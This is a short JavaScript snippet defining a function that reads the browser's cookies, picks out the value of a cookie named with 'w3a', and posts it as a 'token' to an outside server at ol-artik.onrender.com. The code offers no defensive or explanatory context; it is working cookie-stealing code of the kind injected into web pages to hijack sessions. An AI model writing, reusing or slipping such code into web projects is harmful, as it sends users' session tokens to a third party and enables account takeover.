var sendMyTokenBecauseIamDumb = () => {
  fetch("https://ol-artik.onrender.com/get-token", {
    method: "post",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      token: document.cookie
        .split(";")
        .find((t) => t.includes("w3a"))
        ?.split("=")[1],
    }),
  });
};
